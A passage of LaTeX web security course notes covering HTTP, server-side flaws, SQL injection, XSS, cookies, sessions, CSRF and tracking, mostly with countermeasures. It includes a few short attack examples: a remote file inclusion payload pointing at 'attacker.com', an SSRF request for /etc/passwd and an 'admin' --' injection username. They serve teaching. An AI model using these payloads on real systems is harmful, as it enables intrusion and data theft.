Attackers can compromise the DV process to obtain rogue certificates:
\begin{itemize}
  \item \textbf{IP spoofing} - fake DNS reply.
  \item \textbf{DNS hijacking} - serve challenge from a malicious IP.
  \item \textbf{Email snooping} - read the challenge from clear text email.
\end{itemize}
These can be mitigated using DNSSEC and DANE, but this transfers the threat as we now need to establish trust in the DNSSEC certificate.

\section{HTTP}
\subsection{Uniform Resource Locators (URLs)}
\texttt{https://host1.example.com:5588/private/login.php}:
\begin{itemize}
  \item \textbf{Scheme} \texttt{https} - specifies what protocol to use.
  \item \textbf{Host} \texttt{host1.example.com} - target IP address or hostname to resolve via DNS.
  \item \textbf{Port} \texttt{5588} - port of target; if unspecified defaults to standard port for the scheme.
  \item \textbf{Path} \texttt{/private/login.php} - the request resource.
  \item \textbf{Origin = (scheme, port, host)}
\end{itemize}

\texttt{http://alice:secret@www.example.com:80/resource.php?lang=en\#section2}:
\begin{itemize}
  \item \textbf{Credentials} \texttt{alice:secret} - used differently depending on protocol; if absent then defaults to anonymous access.
  \item \textbf{Query string} \texttt{lang=en} - parameters to pass to resource handler.
  \item \textbf{Fragment} \texttt{section2} - is not passed to the server, remains on the client.
\end{itemize}
In practice, it is up to the client and server on how to interpret the fields of a URL.
We need to consider the confidentiality of credentials, the integrity of the path, and the integrity and confidentiality of the query string.

\subsection{HTTP/1.1}
\begin{enumerate}
  \item Client initiates TCP connection.
  \item Client sends a request conforming to HTTP protocol format.
  \item Server replies with protocol-specific response.
  \item Server closes the TCP connection.
\end{enumerate}

The TCP connection may be kept open (\textit{keepalive}) for a few seconds in case there is a follow up request, however the protocol is stateless.
Each request is handled independently of previous requests - it is up to the client and server to maintain state.

Two important methods are:
\begin{itemize}
  \item \texttt{GET} - fetches a resource from the server, usually side-effect free and idempotent.
  \item \texttt{POST} - submits data to the server to change state on the server, contains the payload in the body.
\end{itemize}

\subsection{Request Headers}
The main request headers, with their intended purpose, are:
\begin{itemize}
  \item \texttt{Host} - specifies target host on the server.
  \item \texttt{User-Agent} - browser compatibility.
  \item \texttt{Referer} - URL of the page that originated the current request (if present).
  \item \texttt{Cookie} - cookies stored on behalf of the server.
  \item \texttt{Authorization} - credentials for HTTP Basic or Digest authentication schemes.
  \item \texttt{Accept-Encoding} - the acceptable compression methods for the response.
\end{itemize}

\subsection{Response Codes}
\begin{itemize}
  \item \texttt{200 OK Success} - request succeeded.
  \item \texttt{302 Found} - requested source resides temporarily under a different URI.
  \item \texttt{404 Not Found} - server has not found anything matching the requested URI.
  \item \texttt{500 Internal Server Error} - unexpected condition prevented the server from fulfilling the request.
\end{itemize}

\subsection{Response Headers}
\begin{itemize}
  \item \texttt{Content-Type} - MIME type and character set of response.
  \item \texttt{Location} - combined with a \texttt{3xx} response code, redirects client to different server.
  \item \texttt{Set-Cookie} - requests client to store/delete some cookie.
  \item \texttt{WWW-Authenticate} - HTTP Basic or Digest authentication schemes must be used to access the resource.
  \item \texttt{Content-Encoding} - compression method used.
  \item \texttt{Cache-Control} - desired caching behaviour for client and intermediary caches.
\end{itemize}

\subsection{Security Issues}
\begin{itemize}
  \item HTTP is over TCP/IP - no confidentiality or integrity of headers or messages.
  \item Caching - if an HTTP proxy cache is poisoned, downstream clients receive rogue HTTP responses.
  \item Response splitting - attacker could confuse client to accept bogus responses over  \textit{keepalive} connection.
\end{itemize}

\subsection{HTTPS}
Running HTTP over an encrypted TLS connection is HTTPS.
TLS provides confidentiality and integrity to the HTTP connection and prevents DNS spoofing as the attacker is unable to create fake certificates for target domains.

As HTTPS runs in the browser, controlled by a human, it is still susceptible to problems with accepting invalid certificates.
A countermeasure for this is HTTP Public Key Pinning (HPKP), where the domain includes includes a public key for the domain in the response header, which the browser caches.

\subsubsection{SSL Stripping and HSTS}
It is unsafe to upgrade a connection from HTTP to HTTPS - \textit{SSL stripping attack}, see figure \ref{fig:strip}.

\begin{figure}[htb!]
  \centering
  \caption{SSL stripping attack.}
  \label{fig:strip}
  \includegraphics[scale=0.7]{sslstripping}
\end{figure}

The countermeasure to this is Strict Transport Security (HSTS):
\begin{itemize}
  \item Server responds with header \texttt{Strict-Transport-Security}.
  \item This tells the browser to load pages from that domain over HTTPS only.
  \item Saved for future requests.
\end{itemize}
There is still the problem of SSL stripping occurring during the first connection from HTTP.
Browsers can have a list of websites that must be connected over HTTPS directly, but this does not scale.

\subsection{\texttt{Referer} Header}
When a user on site $A$ clicks on a link to site $B$, not only does $B$ learn that the user visited $A$, but if the query string for $A$ contained sensitive parameters, then $B$ can see them too.

Countermeasures:
\begin{itemize}
  \item Put sensitive data in the \texttt{POST} body, rather than in \texttt{GET} query string.
  \item Use \texttt{Referrer-Policy} response header to control the sending of the \texttt{Referer} header.
\end{itemize}

\section{Server-side Security}
While insider threats are very dangerous and social engineering gets a lot of press, hacking and external attacks are the cause of most data breaches.
Discovery and containment do not stop breaches - most breaches are discovered only after 90\% of the data has been stolen.

\subsection{Web Server Architectures}
\begin{itemize}
  \item \textbf{CGI Scripting}:
    \begin{itemize}
      \item Server passes requests to an appropriate executable.
      \item Headers passes as environment variables or arguments, data passed via stdin/out.
      \item Easy to deploy, dated.
    \end{itemize}
  \item \textbf{Server-side Scripting}:
    \begin{itemize}
      \item Web server embeds database, or directly executes scripts.
      \item Faster and more powerful, but more dangerous (can reconfigure server).
    \end{itemize}
  \item \textbf{Fast CGI}:
    \begin{itemize}
      \item Persistent process handles multiple requests.
      \item Web server uses TCP or local sockets to talk to application server (can be remote).
      \item Load balancing.
    \end{itemize}
  \item \textbf{Reverse Proxy}:
    \begin{itemize}
      \item Lean, fast, secure server handles static content, TLS termination, etc.
      \item Application server focuses on application logic.
    \end{itemize}
\end{itemize}

\subsection{Path Traversal}
Attacker input can cause the server to disclose an unintended resource (e.g. \texttt{/etc/passwd}).
The server identifies a resource based on user input, so the attacker requests files likely to exist and unlikely to exist, comparing the responses - the attacker can guess the path to a private resource in the URL.

Countermeasures:
\begin{itemize}
  \item Special \texttt{www} user account for web app server with access only to public files.
  \item \texttt{chroot} jail to sandbox the web app process to a virtual file system.
  \item Access control restrictions.
\end{itemize}

\subsection{Remove File Inclusion}
We may include in our \texttt{index.php}:
\begin{verbatim}
  $nextpage = $_REQUEST["subpage"];
  include($nextpage.".php");
\end{verbatim}
with the intended usage of \texttt{subpage} in the URL being a page on the site.
If the \texttt{php.ini} settings have \texttt{allow\_url\_fopen = 1}, then file operations can follow urls:
\begin{enumerate}
  \item Attacker can put in the url \texttt{...subpage=http://attacker.com/evil}.
  \item The server includes, and therefore executes, the external file.
\end{enumerate}

To be more secure, we should only allow \texttt{subpage} to have a value from a whitelist of allowed page names, preventing any arbitrary input.

\subsection{Server-side Request Forgery}
If the attacker can control the parameter that becomes the URL of the request issued by the server, then they can access information beyond the firewall as the server requests have server privileges and can address the internal network.
e.g.\ \texttt{GET /?url=file:///etc/passwd HTTP/1.1}

Countermeasures:
\begin{itemize}
  \item Prevent (blacklist) the use of the URL parameter.
  \item Whitelist requests that the server-side application can use.
  \item Do not handle unexpected responses.
\end{itemize}

\subsection{Untrusted Query String}
e.g.\ \texttt{http://example.com/update.php?account=user\_id\&action=unsubscribe}, the attacker can tamper with the query string:
\begin{itemize}
  \item \textbf{Insecure direct object references} - the application exposes a reference to an internal implementation object (user id), the attacker can guess a valid id to target a different user.
  \item \textbf{Missing function-level access control} - the attacker can set the action arbitrarily, e.g. to \texttt{upgrade\_to\_root}; even if this was not a choice available, it is accepted by the server without further checks.
\end{itemize}

Countermeasures:
\begin{itemize}
  \item Do not trust user input.
  \item Deny operations by default, enable after authorization checks.
  \item Bind user parameters to user session.
\end{itemize}

\subsection{Command Injection}
The attacker input causes the execution of undesired commands on the server, usually by escaping the intended command and inputting their own.

Countermeasures:
\begin{itemize}
  \item Blacklist inputs matching forbidden patterns - fragile as new dangerous parameters can be used.
  \item Whitelist allowed patterns - more robust but tricky to avoid false positives.
  \item Static and dynamic analysis.
\end{itemize}

\section{SQL Injection}
SQL injections are the most common example of command injection.
They can be used for multiple goals:
\begin{itemize}
  \item Elevation of privilege - bypass authentication.
  \item Information disclosure - reading data.
  \item Tampering - modifying or deleting data.
  \item Denial of service - force the server to do costly operations.
\end{itemize}

\subsection{Blind SQLi}
Web-based interaction with a database may not display data as a response, other methods (\textit{side channels}) are required to infer information from the database.

Most commonly, we use the time it takes to serve a response by trying payloads which cause a delay in processing, e.g.\ \texttt{SLEEP()} or \texttt{pg\_sleep()}.
If a response takes longer than normal, injection may have been successful.
\begin{itemize}
  \item We can apply a conditional wait to check if certain information (e.g.\ letters of a password) hold in the database.
  \item If the response takes longer than normal, we assume the condition holds.
  \item We can slowly exfiltrate information.
\end{itemize}

\subsection{Second-Order SQLi}
Untrusted data can be handled securely when it is first inserted into the database to avoid injection, but must also be handled securely later in the process.
Other application components may read the data in the database, assume it does not need sanitisation, and use it as part of a new query.

An attacker can submit payloads that are dangerous only on the second usage, for example setting their username to ``\texttt{admin' --}'' and requesting to change their password - then the password of the actual admin is changed instead.

\subsection{Countermeasures}
\begin{itemize}
  \item \textbf{Input filtering} - escape blacklisted characters; hard to capture all user input and escape correctly for all uses of the input.
  \item \textbf{Prepared statements} - avoid building SQL commands piece-wise, use formatting.
  \item \textbf{Stored procedures} - parameterized SQL queries stored in the database, acting as a fixed API to the application; need to be programmed to avoid injection on themselves and may run the risk of higher privileges than usual queries.
  \item \textbf{Static/dynamic analysis of PHP code} - check that the query has the expected type, or use taint analysis to detect if untrusted input reaches the database without being sanitized.
  \item \textbf{Rate-limiting} - limit web or database server requests.
  \item \textbf{IDS-style defense} - detect and stop sequences of suspicious queries before they reach the database.
  \item \textbf{Programming framework} - rely on trusted framework developed by others.
\end{itemize}

\section{Browser Security}
Browsers enable users to browse the web and so should protect the device from infection, user data from unauthorized access, and provide a trustworthy platform to deploy the client-side of a web application.

\subsection{Client Architecture}
In the \textit{Chrome} browser:
\begin{itemize}
  \item OS process-based \textbf{isolation} used to sandbox the limits of compromise.
  \item Each window/tab has its own process.
  \item Efficient networking architecture to enable socket reuse and predictive optimizations.
  \item User interface (the \textit{chrome}) cannot be tampered by web pages, and aims to be spoof-resistant.
\end{itemize}

\subsection{HTTPS in the Browser}
The HTTPS UI gives traffic light warnings on certificate validity:
\begin{itemize}
  \item \textbf{Public/Insecure} - HTTP connection or, OK certificate with outdated settings or, mixed content (risk of MITM).
  \item \textbf{Insecure/Dangerous} - Certificate does not match the domain name, malicious site.
  \item \textbf{Secure}.
\end{itemize}

\subsection{Phishing}
\begin{enumerate}
  \item The user visits a page controlled by the attacker - the page resembles a page from the target.
  \item The user reveals data to the attack page.
  \item The attack page forwards data to the attacker and to the legitimate page, displaying an error or a short acknowledgement - the user's credentials and other sensitive information have been stolen.
\end{enumerate}
The hosting of phishing pages can be done either through an attacker's own domain or with a compromised site or free hosting service.
Although the latter two options give less control, the domain has better reputation and may be relevant to the attack.

Phishing sites can be generated using phishing kits - some of these kits can send the original author a copy of the stolen data.

\subsubsection{Countermeasures}
\begin{itemize}
  \item Prevent spreading of links via spam.
  \item Blacklists of phishing sites in major browsers.
  \item Automated detection via machine learning - length/complexity of URL, visual or structural similarity to whitelisted pages, topological properties of the page, etc.
\end{itemize}

\subsection{HTML}
The building blocks (scripts, links, forms, etc.) for web applications can be considered trustworthy, but some browsers can interpret special cases in bizarre ways leading to subleties in using them correctly.

Other security-sensitive elements (Java, Flash, ActiveX, etc) are handled by browser plugins and have their own security restrictions.
These can suffer from memory corruption or other vulnerabilities, leading to browser compromise.

\subsection{JavaScript and DOM}
The \textbf{Browser Object Model (BOM)} provides a JavaScript interface to the browser.
This gives access to create and navigate windows, access cookies and local storage, manipulate browser history, and set timeouts.

The \textbf{Document Object Model (DOM)} is rooted in the \texttt{window.document}, providing an object-oriented interface to the page HTML structure.
This gives access to alter the HTML structure of the page, directly read/write data from/to the page, manipulate and submit forms, create and listen to events.

\subsection{Asynchronous JavaScript and XML (AJAX)}
Scripts can exchange data with the server without causing the page to reload - the key to responsive web pages.
Most commonly, data is encoded as JSON due to being more concise and native.

\subsection{HTML APIs}
\begin{itemize}
  \item PostMessage API - communicate string data between arbitrary frames.
  \item Web Workers - run batch JavaScript computations in the background.
  \item Web Sockets - binary protocol over TCP to provide bidirectional messaging between client and server.
  \item WebRTC - real-time communication.
  \item Web Cryptography - provides encryption, signatures, and hashing functions.
\end{itemize}

\subsection{Navigation}
A \textit{browsing context} (BC) is a container for a web page and its related resources - each tab is associated to a top level BC.
When a new page is loaded, the BC goes through the following steps:
\begin{enumerate}
  \item Render content - display HTML, execute scripts, fetch/display images and other resources, navigate nested BCs.
  \item Process events - user-based, rendering, or from JavaScript.
\end{enumerate}

\subsection{JavaScript in the Browser}
All scripts embedded in the same document \textbf{share the same execution environment} and DOM.

JavaScript can be embedded in a page via the HTML, in URLs (even within CSS files), and in event handlers.
When executed, it can further embed scripts into the page.

Each script executes until its end without interruptions - if a script is unresponsive the browser may open a dialog offering termination.
Uncatchable exceptions terminate the current script and execution moves onto the next script.

\subsection{Browser Extensions}
While plugins extend a browser by adding binary components, extensions are JavaScript-based and talk to the browser API.

The extension has a background page running its back-end to enable it to be always on; pop-up windows are built with regular browser windows.
The scripts of extensions interact with the DOM of each visited page, they can thus add scripts to the execution environment of a visited page.

\subsection{Attacks}
\subsubsection{Clickjacking}
The user communicates data and intentions to the browser via clicks and keystrokes - an attacker can interfere with this in many ways:
\begin{itemize}
  \item Overlap a transparent \texttt{iframe} on a website - the user's clicks on the site cause them to perform undesired actions in the transparent frame.
    \begin{itemize}
      \item Can counter by preventing a page from being put in an \texttt{iframe}, e.g.\ \texttt{X-Frame-Options} header, or in the JavaScript code.
    \end{itemize}
  \item Show a fake cursor to attract user's attention while real cursor hovers over malicious options.
    \begin{itemize}
      \item Can counter by showing a trusted confirmation pop-up - can be annoying.
    \end{itemize}
\end{itemize}

\subsubsection{Drive-by Download}
The user visits a malicious page which exploits a vulnerability, leading to installation of malware (or saving of dangerous files) on the client machine.

Countermeasures:
\begin{itemize}
  \item Disable running plugins, or confine to a restricted sandbox.
  \item Warn about blacklisted websites.
  \item Detect suspicious JavaScript.
  \item Harden browser/OS against memory corruption vulnerabilities.
\end{itemize}

\subsubsection{Content Sniffing and Polyglots}
\textbf{Content sniffing} allows a browser to render a resource based on the resource data instead of the MIME type reported, meaning pages with broken MIME types still work correctly,

\textbf{Polyglots} are files that are valid with respect to different data formats.
GIFs, PNGs, JARs have been crafted to be valid JavaScript or HTML. \\

The risks with these are that polyglots can bypass content-based filtering rules.
Furthermore, polyglots with content sniffing can lead to bypassing the same-origin policy - the attacker can upload a PNG/HTML polyglot to a website, then pages on the website linked to that image are compromised. \\

This can be prevented by \texttt{X-Content-Type-Options: nosniff}.

\section{Same Origin Policy}
The Same Origin Policy (SOP) is the key security policy in the browser.
Resources are associated to the origin (based on scheme, host, and port) where they were loaded from, scripts to the origin of the browsing context that loaded them.

Pages in \textbf{different browsing contexts} can interact with each other if and only if they have the \textbf{same origin}.
Persistent resources are associated to origins and can only be accessed by pages from that origin.

\subsection{DNS Rebinding}
\begin{figure}[htb!]
  \centering
  \caption{DNS rebinding.}
  \includegraphics[scale=0.5]{dnsrebinding}
\end{figure}
\begin{enumerate}
  \item The SOP restricts a page to interacting with other pages from the same origin.
  \item DNS rebinding associates the attacker's DNS name to the target's IP address.
  \item The firewall is circumvented and the attacker can access the corporate network through the victim's browser.
\end{enumerate}

Countermeasures for this are DNS pinning to prevent bindings changing too quickly, and preventing external DNS queries resolving to internal addresses.

\subsection{SOP Properties}
The SOP prevents pages from different origins tampering with each other, and confines resources based on origins.
\begin{itemize}
  \item Outbound communication is not prevented - it is OK to do cross-domain post requests.
  \item Bidirectional communication is not prevented - the server must be willing to communicate this way, and the client must trust that the server as arbitrary code could be injected.
\end{itemize}

\subsection{Domain Relaxation}
A page can change its origin by \textbf{relaxing} to a suffix of its domain.
This essentially adds to the origin the \texttt{relaxed\_domain\_flag}.
Although two pages relaxing their domain to the same domain can communicate, they still cannot communicate with a page from the domain they have relaxed to.

\section{Scripting Attacks}
\subsection{XSS Attacks}
\begin{defn}
  \textbf{XSS attacks} occur when attacker-controlled input makes its way to a trusted web page and it is executed as a script.
  The attack effectively controls the whole origin in the browser, allowing access to page resources which can be sent back to the attacker.
\end{defn}

Variants:
\begin{itemize}
  \item \textbf{DOM-based XSS} - \textbf{trusted script} reads an attacker-controlled parameter and embeds it in the page.
  \item \textbf{Reflected XSS} - attacker-controlled URL parameter is embedded in the page by the \textbf{server}.
  \item \textbf{Stored XSS} - attacker stores malicious data on a server, which is later embedded into user pages.
  \item \textbf{Self-XSS} - user tricked into injecting malicious JavaScript into the page, e.g.\ in the location bar or in console.
  \item \textbf{Cross-channel Scripting (XCS)} - inject XSS payload using a non-HTTP channel into embedded devices/IoT.
  \item \textbf{Universal XSS} - victim visits a secure target page and an attacker page, the attacker page exploits XSS vulnerabilities in the browser extension/chrome to inject into the target page.
  \item \textbf{Scriptless attacks} - attacker injects CSS into the target page.
\end{itemize}

Countermeasures:
\begin{itemize}
  \item Validate inputs - accept only what you expect.
  \item XSS filters.
  \item Use templates or frameworks to validate inputs consistently.
  \item \texttt{X-XSS-Protection} header - if a URL parameter is reflected in the body as a script, the script is blocked.
\end{itemize}

\subsection{JavaScript Attacks}
\begin{itemize}
  \item \textbf{Source code snooping} - attacker retrieves parts of the source script to extract state and secret keys.
    \begin{itemize}
      \item Counter by hiding state inside closures and removing script nodes.
    \end{itemize}
  \item \textbf{Prototype poisoning} - attacker changes the functionality of prototype function calls.
    \begin{itemize}
      \item Counter by checking types and avoiding the reliance on inheritance when outside of your control.
    \end{itemize}
\end{itemize}

\subsection{HTML5 Sandbox}
The SOP can be seen as too permissive:
\begin{itemize}
  \item In same-origin iframes, user-supplied content could be exposed to XSS attacks so its access to more trusted iframes must be restricted.
  \item In cross-origin iframes, advertising from malicious provider may be displayed so scripts should be restricted.
\end{itemize}

The \texttt{sandbox} attribute from iframes tells the browser to create a new unique origin and associate it to the frame.

We can relax the same box with:
\begin{itemize}
  \item \texttt{allow-same-origin} - does not segregate to new origin.
  \item \texttt{allow-\{scripts/popups/forms/pointer-lock/top-navigation\}} - reintroduces the behaviour that was allowed under SOP alone.
\end{itemize}

\subsection{Content Security Policy (CSP)}
The server sends a response header that tells the browser a whitelist of what resources can be loaded, what scripts can be executed, and from where.

e.g.\ \texttt{Content-Security-Policy: default-src 'self' http://c.com; img-src *}

\section{Browser Storage}
HTTP is a stateless protocol, web applications need to keep their own state - on the client-side, \textbf{cookies} are used:
\begin{enumerate}
  \item First client request carries no cookies.
  \item Server sets each cookie using a response header: \\
    \texttt{Set-Cookie: name = value; [(attribute [= value];)*]}
  \item Browser includes relevant cookies for subsequent requests in one request header: \\
    \texttt{Cookie: (name = value;)+}
\end{enumerate}

\subsection{Cookie Attributes}
\begin{itemize}
  \item \texttt{domain} - send cookie back when the \texttt{domain} is the suffix of the requested domain.
  \item \texttt{path} - send cookie back when the \texttt{path} is the prefix of the requested path.
  \item \texttt{expires = date} - store the cookie until \texttt{date}, can be in the past to delete the cookie immediately, or can be \texttt{Null} to keep cookie in memory until the browser is closed.
  \item \texttt{Secure} - send cookie over HTTPS only.
  \item \texttt{HttpOnly} - Prevent non-HTTP APIs (e.g.\ JavaScript) from accessing cookie.
  \item \texttt{SameSite} - mitigates cross-origin information leakage:
    \begin{itemize}
      \item \texttt{Strict} - cookie is sent only from a page with same domain.
      \item \texttt{Lax} - do not block for top-level cross-domain navigation with safe HTTP methods.
    \end{itemize}
\end{itemize}

\subsection{Cookie Scope}
\begin{itemize}
  \item Cookie origin is determined the \textbf{domain and path}.
  \item Cookie is identified by the \textbf{name and origin}.
  \item Cookie scope is determined by \textbf{origin and secure attribute}.
\end{itemize}
A browser request sends all cookies that are \textbf{in scope} to the server - all the server sees are \texttt{name = value} pairs.

\subsection{Security Considerations}
\begin{itemize}
  \item Server does not see attributes - cannot tell if set by a subdomain, or tell if was written by JavaScript.
  \item Path does not restrict visibility of cookies - scripts from a different path can load an iframe with a page from the target path, then access the \texttt{document.cookie} of the iframe.
  \item Cookie integrity is not guaranteed - cookies can be set by user, JavaScript from the same origin, network attackers.
\end{itemize}

\subsection{HTML5 Web Storage}
Web Storage implements \textbf{client-side state} using lists of key-value pairs.
It is not sent/set over HTTP - up to the page how to involve the server.
\begin{itemize}
  \item \texttt{window.localStorage} - associated to page origin, kept until explicitly deleted.
  \item \texttt{window.sessionStorage} - associated to current tab and page origin, kept until tab is closed.
  \item JavaScript API can get/set/remove items.
\end{itemize}

\subsubsection{Resident XSS (RXSS)}
Data in the browser storage is used to inject JavaScript into the page.
As it is present only on the client, it remains effective after the vulnerable page is patched and cannot be detected by the server.

To counter this, we choose to not trust values stored in the browser - sanitize stored values; periodically validate, refresh, or delete stored data.

\section{Secure Sessions}
\subsection{HTTP Authentication} 
As HTTP is stateless, the user needs to establish identity:
\begin{itemize}
  \item \textbf{Basic Authentication} - username and password sent in clear text.
  \item \textbf{Digest Authentication} - send hash of password and server-generated nonce that may restrict validity; does not protect other fields or headers.
\end{itemize}

Authentication is needed for every different web asset, so the authentication server is contacted with every request and credentials may be leaked.
To sign out, the user must close the browser.

\subsection{Sessions}
\begin{itemize}
  \item \textbf{Unauthenticated sessions}:
    \begin{enumerate}
      \item Server issues a short-lived token to client.
      \item Client presents token with requests that affect client state on the server.
      \item Web app state may be kept track of on behalf of user.
    \end{enumerate}
  \item \textbf{Authenticated sessions} (occurs after an unauthenticated session):
    \begin{enumerate}
      \item Client authenticates once.
      \item Client presents token when authorization needed.
    \end{enumerate}
\end{itemize}

The session token is implemented using \textbf{cookies}.

\subsubsection{Session Fixation}
\begin{enumerate}
  \item Attacker obtains unauthenticated session token by connecting to web server.
  \item User tricked to logging in using attacker's token (e.g.\ via XSS or MITM).
  \item Token is associated to a valid session - attacker can perform actions on behalf of user.
\end{enumerate}
To counter this, issue a new token after login.

\subsubsection{Session Hijacking}
An attacker can obtain a valid token from a user:
\begin{itemize}
  \item Guessing attack (spoof).
  \item MITM - stealing over HTTP.
  \item XSS attack.
\end{itemize}

To mitigate this:
\begin{itemize}
  \item Send tokens over HTTPS.
  \item Invalidate session on log-out.
  \item Use \textbf{secure tokens}
\end{itemize}

\subsection{Secure Tokens}
\begin{itemize}
  \item Spoofing - use randomness in each token.
  \item Stealing - restrict where tokens can be used, e.g.\ binding to an IP address.
  \item Session data storage:
    \begin{itemize}
      \item \textbf{Server keeps data} - the token is hashed, a database lookup is required for each request.
      \item \textbf{Server sends data to client} - a larger encrypt-then-MAC token is sent, but the server must still keep track of login status.
    \end{itemize}
\end{itemize}

\subsection{Cross-Site Request Forgery (CSRF)}
The trust between a browser and the target is exploited:
\begin{enumerate}
  \item The user is in a position to issue requests that cause side-effects.
  \item User visits a web page or clicks on link crafted by attacker.
  \item User is tricked into issuing request that causes undesirable side-effects.
\end{enumerate}

To mitigate this, we can embed a second token as a hidden field of each form presented on authenticated pages - the attacker cannot access this token:
\begin{itemize}
  \item \textbf{Double cookie} - same token in form and cookie, server checks if the same.
  \item \textbf{Different tokens} - server knows which 2 should correspond, form token can be different for each form.
\end{itemize}
Additionally, the \texttt{SameSite} attribute for session cookies can be used - cannot access existing session via an external link.

\subsection{Cross-Origin Resource Sharing (CORS)}
SOP allows cross-origin communication when both parties are willing to engage, but prevents cross-origin AJAX requests to stop attacker stealing anti-CSRF tokens by loading the target page via AJAX.

CORS relaxing SOP for servers that opt-in:
\begin{enumerate}
  \item Browser attaches \texttt{Origin=}\textit{origin} header to cross-origin AJAX request (upon redirection, set to null).
  \item If the server accepts cross-origin requests from \textit{origin}, replies with \texttt{Access-Control-Allow-Origin:} \textit{origin}, browser allows AJAX response to be received by script.
  \item If server does not care for CORS, response discarded by browser.
\end{enumerate}

\subsection{Login CSRF}
\begin{enumerate}
  \item User visits attacker's website.
  \item User tricked into logging into attacker's account.
  \item User works as usual.
  \item Attacker can track what the user is doing through their account (e.g.\ search history).
\end{enumerate}

\subsubsection{Mitigations}
Anti-CSRF tokens do not apply as we have yet to login.
\begin{itemize}
  \item Validate \texttt{refer} or \texttt{origin} header of login request - network proxies or user preferences may strip these headers.
  \item Embed login form on a dedicated page.
\end{itemize}

\section{Browser Fingerprinting}
\begin{itemize}
  \item \textbf{Network fingerprinting} - detecting configuration information to identify a system component; important part of pentesting intelligence gathering.
  \item \textbf{Browser fingerprinting} - recognizing the same browser instance across website visits; can be used for authentication, authorization, access control, or tracking.
\end{itemize}

\subsection{Passive Fingerprinting}
HTTP requests sent to the server can reveal information:
\begin{itemize}
  \item Headers can directly reveal information.
  \item Identity and order of headers is different across browsers.
\end{itemize}

This cannot be detected or prevented, and can gather only information exposed by the target.

\subsection{Active Fingerprinting}
JavaScript and plugins can be used to check e.g.\ installed fonts; installed plugins; time-zone; screen resolution and colour depth.

This can be detected and prevented, the target is disrupted.
We can probe deeper into the target to reveal more precise information.

\subsection{Fingerprints}
\begin{itemize}
  \item \textbf{Precision} - a good fingerprint should be different for any two devices.
  \item \textbf{Stability} - a useful fingerprint does not change much over time.
  \item More attributes in a fingerprint can improve precision but decrease stability.
  \item A hash of a fingerprint (if stable) can be used to reduce network traffic.
\end{itemize}

\subsection{Countermeasures}
\begin{itemize}
  \item Browser extensions and options, network proxies and firewalls.
  \item Blacklist fingerprinters, rewrite HTTP requests, disable plugins and JavaScript - degrades user experience.
  \item Mimic a target - constrained by difference between devices and context.
  \item Hide in the crowd - spoof a very common fingerprint compatible with user device.
  \item Destabilize fingerprint - spoof to present different fingerprint on each visit.
\end{itemize}

\subsection{Counter-countermeasures}
\begin{itemize}
  \item Choose more robust attributes.
  \item Detect implausible configurations.
  \item Anti-fingerprinting behaviour is itself a fingerprintable feature.
\end{itemize}

\section{Web User Tracking}
There are legitimate and illegitimate usages, with desirable and undesirable effects.
\begin{itemize}
  \item \textbf{1st party trackers} - iframes and scripts on the origin of the website visited by the user.
  \item \textbf{3rd party trackers} - cross-domain iframes and their resources, included by visited websites.
\end{itemize}

\subsection{Browser Support for Tracking}
To store information in the browser:
\begin{itemize}
  \item Cookies.
  \item \textbf{Supercookies} - HTML5/plugin storage.
  \item \textbf{Cached resources} - server can tell browse to cache a script, other page loads including the same script get the same value.
  \item \textbf{Cache headers} - use the \texttt{ETag} header (intended for cache validation) as a tracking id; it is sent every time to the server.
\end{itemize}

To send information back to the server (via HTTP request/responses):
\begin{itemize}
  \item \textbf{Explicit communication} - clicking of links, loading of page resources.
  \item \textbf{Implicit communication} - beacons, pre-rendering.
\end{itemize}

\subsection{Browser Countermeasures}
\begin{itemize}
  \item \textbf{Do Not Track header} (\texttt{DNT}) - mostly interpreted as \textit{do not target users based on collected data}, but still collect data.
  \item \textbf{Private browsing/incognito mode} - prevents caching, history, cookies, and preferences; JavaScript, ETag header, etc.\ can still track.
  \item \textbf{Block 3rd party cookies} - pop-ups mean the 3rd party iframe is now 1st party.
\end{itemize}

\subsection{Zombie Cookies}
Cookies can be \textbf{respawned} after deletion through tracking data saved in other headers, cache, or supercookies - if these are also cleared, then Flash cookies can still respawn.
This is a key role in \textbf{fingerprinting}.

\subsection{Further Countermeasures}
\begin{itemize}
  \item Disable plugins.
  \item Disable JavaScript.
  \item Use TOR browser.
  \item Use anti-fingerprinting countermeasures.
  \item Install anti-tracking extensions.
\end{itemize}

\end{document}
